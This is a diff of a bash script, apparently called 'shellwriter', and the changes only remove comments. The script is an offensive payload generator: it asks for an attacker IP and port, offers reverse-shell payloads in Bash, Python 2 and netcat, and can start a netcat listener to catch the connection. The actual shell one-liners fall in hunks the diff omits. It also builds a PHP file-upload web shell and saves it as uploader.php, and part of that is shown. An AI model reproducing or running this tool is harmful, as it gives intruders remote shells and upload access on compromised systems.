@@ -1,20 +1,16 @@
 #!/bin/bash
 
-# --- Colors ---
 RED="\e[31m"
 GREEN="\e[32m"
 YELLOW="\e[33m"
 BLUE="\e[34m"
 RESET="\e[0m"
 
-# --- Configuration ---
 LHOST=""
 LPORT=""
 START_LISTENER=false
 
-# --- Validation Functions ---
 
-# Validates an IP address
 validate_ip() {
     local ip=$1
     if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
@@ -32,7 +28,6 @@ validate_ip() {
     fi
 }
 
-# Validates a port number
 validate_port() {
     local port=$1
     if [[ ! $port =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
@@ -41,9 +36,7 @@ validate_port() {
     fi
 }
 
-# --- Core Functions ---
 
-# Displays the help message
 show_help() {
     if command -v figlet &> /dev/null; then
         figlet shellwriter
@@ -72,7 +65,6 @@ show_help() {
     exit 0
 }
 
-# Starts a netcat listener
 start_listener() {
     if ! command -v nc &> /dev/null; then
         echo -e "${RED}❌ 'netcat' (nc) is not installed. Cannot start listener.${RESET}" >&2
@@ -83,14 +75,11 @@ start_listener() {
     echo -e "${YELLOW}⚠️ Listener terminated.${RESET}"
 }
 
-# --- Main Logic ---
 
-# Check for dependencies
 if ! command -v nc &> /dev/null; then
     echo -e "${YELLOW}⚠️ Warning: 'netcat' (nc) is not installed. The listener (-l) and netcat payload ('f') will not work.${RESET}" >&2
 fi
 
-# Parse command-line options
 while getopts ":i:p:lth" opt; do
   case $opt in
     i) LHOST=$OPTARG ;;
@@ -113,12 +102,10 @@ while getopts ":i:p:lth" opt; do
   esac
 done
 
-# If no options were provided, show help
 if [ $OPTIND -eq 1 ]; then
     show_help
 fi
 
-# --- Interactive Mode (if args are missing) ---
 if [[ -z "$LHOST" ]]; then
     read -p "Enter LHOST (IP): " LHOST
 fi
@@ -127,13 +114,11 @@ if [[ -z "$LPORT" ]]; then
     read -p "Enter LPORT (Port): " LPORT
 fi
 
-# Validate inputs
 echo -e "${YELLOW}⚠️  Validating IP and Port...${RESET}"
 validate_ip "$LHOST"
 validate_port "$LPORT"
 echo -e "${GREEN}✅ IP and Port are valid: $LHOST:$LPORT${RESET}"
 
-# --- Payload Menu ---
 echo -e "${BLUE}Choose a payload type:${RESET}"
 echo "  a) Bash"
 echo "  s) Python 2"
@@ -195,23 +180,20 @@ if(isset(\$_FILES['file'])){
 </form>
 "
         ;;
-    *) # Invalid
+    *) 
         echo -e "${RED}❌ Invalid choice!${RESET}"
         exit 1
         ;;
 esac
 
-# --- Output ---
 echo -e "${GREEN}✅ Payload Generated:${RESET}"
 echo -e "${YELLOW}$payload${RESET}"
 
-# If PHP Uploader, save to file
 if [[ $choice == "u" ]]; then
     echo "$payload" > uploader.php
     echo -e "${GREEN}📂 File saved as: uploader.php${RESET}"
 fi
 
-# Start listener if flagged
 if [ "$START_LISTENER" = true ]; then
     echo ""
     start_listener
